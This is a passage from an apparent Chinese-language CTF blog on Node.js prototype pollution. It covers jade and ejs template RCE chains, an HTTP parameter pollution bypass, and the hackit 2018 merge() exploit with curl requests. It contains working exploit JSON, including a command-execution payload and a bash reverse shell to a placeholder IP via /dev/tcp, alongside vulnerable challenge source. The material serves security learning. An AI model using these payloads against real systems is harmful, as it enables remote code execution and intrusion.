class="hljs-string">&quot;runing&quot;</span>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>补充，其实污染目标就是node.line，一开始就污染node.line就可以知道只污染哪些属性即可，因为有些属性不配置的话，它要么有默认值，要么就是能部分渲染没完成，不影响我们的污染数据的执行</p><p>对于普通模板，只需要污染self和line，有继承的模板需要污染type</p><p>当有顶格h=title类型的需要污染block类型</p><p>jade入口：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.__express = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">path, options, fn</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(options.compileDebug == <span class="hljs-literal">undefined</span> &amp;&amp; process.env.NODE_ENV === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>    options.compileDebug = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-built_in">exports</span>.renderFile(path, options, fn);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>options.compileDebug</code> 无初始值，可以覆盖开启 Debug 模式，当然也有另外一种情况，部署时，没有正确配置 <code>req.app.get(&#39;env&#39;)</code> 导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>另外<strong>this.debug</strong>哪里来？？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Compiler = <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Compiler</span>(<span class="hljs-params">node, options</span>) </span>&#123;<br>  <span class="hljs-built_in">this</span>.debug = <span class="hljs-literal">false</span> !== options.compileDebug;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure></blockquote><p>最终Exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>,<br><span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;Code&quot;</span>,<br><span class="hljs-attr">&quot;self&quot;</span>:<span class="hljs-number">1</span><br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>来个全家福</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211127000013927.png"></p><h4 id="ctfshow-344"><a href="#ctfshow-344" class="headerlink" title="ctfshow 344"></a>ctfshow 344</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">if</span>(req.url.match(<span class="hljs-regexp">/8c|2c|\,/ig</span>))&#123;<br>  res.end(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-built_in">JSON</span>.parse(req.query.query);<br>  <span class="hljs-keyword">if</span>(query.name===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;query.password===<span class="hljs-string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.isVIP===<span class="hljs-literal">true</span>)&#123;<br>  res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.end(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>不能有8c、2c、逗号</p><p>正常请求：</p><blockquote><p>?query={“name”:”admin”,”password”:”ctfshow”,”isVIP”:true}</p></blockquote><p>这里介绍一下HPP数据污染</p><blockquote><p>Web服务器 　　　　　　 参数获取函数 　　　　　　　　　　   获取到的参数</p><p>PHP/Apache　　 　　  $_GET(“par”) 　　　　　　　　　　 Last</p><p>JSP/Tomcat 　　　　  Request.getParameter(“par”)    First</p><p>Perl(CGI)/Apache 　 Param(“par”) 　　　　　　　　　　 First</p><p>Python/Apache 　　  getvalue(“par”) 　　　　　　　　  All(List)</p><p>ASP/IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)</p></blockquote><p>而nodejs就是会将同名参数以数组进行存储，json.parse也能正常解析</p><blockquote><p>?query={“name”:”admin”&amp;query=”password”:”ctfshow”&amp;query=”isVIP”:true}</p></blockquote><p>逗号已经绕过，url编码看一下</p><blockquote><p>%3Fquery%3D%7B%22name%22%3A%22admin%22%26query%3D%22password%22%3A%22ctfshow%22%26query%3D%22isVIP%22%3Atrue%7D</p></blockquote><p>ctfshow前面出现了一个%22，是双引号，和c成了2c，c得绕一下，进行unicode编码一下%63</p><p>payload：</p><blockquote><p>?query={“name”:”admin”&amp;query=”password”:”%63tfshow”&amp;query=”isVIP”:true}</p></blockquote><h4 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a>hackit 2018</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<br> <br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br> <br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>        <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>            merge(a[attr], b[attr]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a[attr] = b[attr];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">a</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br> <br><span class="hljs-comment">// Constants</span><br><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span>;<br><span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>;<br><span class="hljs-keyword">const</span> admin = &#123;&#125;;<br> <br><span class="hljs-comment">// App</span><br><span class="hljs-keyword">const</span> app = express();<br>app.use(bodyParser.json())<br>app.use(cookieParser());<br> <br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)));<br>app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body));<br>    <span class="hljs-keyword">var</span> copybody = clone(body)<br>    <span class="hljs-keyword">if</span> (copybody.name) &#123;<br>        res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;<br>            <span class="hljs-string">&quot;done&quot;</span>: <span class="hljs-string">&quot;cookie set&quot;</span><br>        &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.json(&#123;<br>            <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;cookie not set&quot;</span><br>        &#125;)<br>    &#125;<br>&#125;);<br>app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> аdmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))<br>    <span class="hljs-keyword">if</span> (admin.аdmin == <span class="hljs-number">1</span>) &#123;<br>        res.send(<span class="hljs-string">&quot;hackim19&#123;&#125;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;You are not authorized&quot;</span>);<br>    &#125;<br>&#125;);<br>app.listen(PORT, HOST);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -vv --header &#x27;Content-type: application/json&#x27; -d &#x27;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&#x27; &#x27;http://0.0.0.0:4000/signup&#x27;; <br><br>curl -vv &#x27;http://0.0.0.0:4000/getFlag&#x27;<br></code></pre></td></tr></table></figure><p>首先请求 /signup 接口，在 NodeJS 服务中，我们调用了有漏洞的 merge 方法，并通过 __proto__ 为 Object.prototype（因为 {}.__proto__ === Object.prototype） 添加上一个新的属性 admin，且值为 1。</p><p>再次请求 getFlag 接口，条件语句 admin.аdmin == 1 为 true，服务被攻击。</p><p>攻击案例出自：Prototype pollution attacks in NodeJS applications</p><p>这样的漏洞在 jQuery $.extend 中也经常见到<br>对于 jQuery：如果担心安全问题，建议升级至最新版本 jQuery 3.4.0，如果还在使用 jQuery 的 1.x 和 2.x 版本，那么你的应用程序和网站仍有可能遭受攻击。</p><h4 id="登录绕过题"><a href="#登录绕过题" class="headerlink" title="登录绕过题"></a>登录绕过题</h4><p>{“user”:[0],”passwd”:[0]}</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png"></p><p>这题可以控制host参数去篡改mysql的连接地址 利用mysql客户端任意文件读取 <a href="https://blog.csdn.net/ls1120704214/article/details/88174003">https://blog.csdn.net/ls1120704214/article/details/88174003</a></p><p>但是如果直接在json中传递{“host”:””},根本不会有任何效果<br>在57行<br><code>if (body.host != undefined) &#123;</code><br>如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址<br>原题作者博客<a href="https://xz.aliyun.com/t/6991">https://xz.aliyun.com/t/6991</a></p><p>不用host参数篡改mysql地址 还可以利用原型链污染：<br><code>&#123;&quot;user&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;test&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><h4 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json()) <span class="hljs-comment">//处理JSON数据</span><br>app.use(<span class="hljs-string">&#x27;/static&#x27;</span>, express.static(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.use(session(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>     <span class="hljs-comment">//设置一下Session</span><br>&#125;))<br>app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err)) <span class="hljs-comment">//调用ejs进行渲染</span><br>        <span class="hljs-keyword">let</span> compiled = lodash.template(content) <span class="hljs-comment">//渲染内容</span><br>        <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="hljs-comment">//动态引入成员变量</span><br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered) <span class="hljs-comment">//传回来</span><br>&#125;)<br>&#125;)<br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br>app.all(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.session.data || &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.method == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.merge(data, req.body)<br>        req.session.data = data<br>    &#125;    <span class="hljs-comment">//将body中的数据传入sessioN中</span><br>res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>    <span class="hljs-attr">language</span>: data.language, <br>    <span class="hljs-attr">category</span>: data.category <span class="hljs-comment">//渲染自己的选择</span><br>&#125;)<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(Example app listening on port <span class="hljs-number">3000</span>!))<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> hbs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>);<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> md5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;md5&#x27;</span>);<br><span class="hljs-keyword">var</span> morganBody = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan-body&#x27;</span>);<br><span class="hljs-keyword">const</span> app = express();<br><span class="hljs-keyword">var</span> user = []; <span class="hljs-comment">//empty for now</span><br><span class="hljs-keyword">var</span> matrix = [];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>    matrix[i] = [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>];<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">draw</span>(<span class="hljs-params">mat</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span> (matrix[i][j] !== <span class="hljs-literal">null</span>)&#123;<br>                count += <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count === <span class="hljs-number">9</span>;<br>&#125;<br>app.use(express.static(<span class="hljs-string">&#x27;public&#x27;</span>));<br>app.use(bodyParser.json());<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>);<br>morganBody(app);<br>app.engine(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>).__express);<br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        matrix[i] = [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>];<br><br>    &#125;<br>    res.render(<span class="hljs-string">&#x27;index&#x27;</span>);<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123; <br>    <span class="hljs-comment">/*this is under development I guess ??*/</span><br>    <span class="hljs-built_in">console</span>.log(user.admintoken);<br>    <span class="hljs-keyword">if</span>(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123;<br>        res.send(<span class="hljs-string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Forbidden&#x27;</span>);<br>    &#125;    <br>&#125;<br>)<br>app.post(<span class="hljs-string">&#x27;/api&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> client = req.body;<br>    <span class="hljs-keyword">var</span> winner = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (client.row &gt; <span class="hljs-number">3</span> || client.col &gt; <span class="hljs-number">3</span>)&#123;<br>        client.row %= <span class="hljs-number">3</span>;<br>        client.col %= <span class="hljs-number">3</span>;<br>    &#125;<br>    matrix[client.row][client.col] = client.data;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === matrix[i][<span class="hljs-number">1</span>] &amp;&amp; matrix[i][<span class="hljs-number">1</span>] === matrix[i][<span class="hljs-number">2</span>] )&#123;<br>            <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">2</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === matrix[<span class="hljs-number">1</span>][i] &amp;&amp; matrix[<span class="hljs-number">1</span>][i] === matrix[<span class="hljs-number">2</span>][i])&#123;<br>            <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">2</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp; matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp; matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">2</span>;<br>    &#125; <br><br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp; matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp; matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (draw(matrix) &amp;&amp; winner === <span class="hljs-literal">null</span>)&#123;<br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">winner</span>: <span class="hljs-number">0</span>&#125;))<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (winner !== <span class="hljs-literal">null</span>) &#123;<br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">winner</span>: winner&#125;))<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span 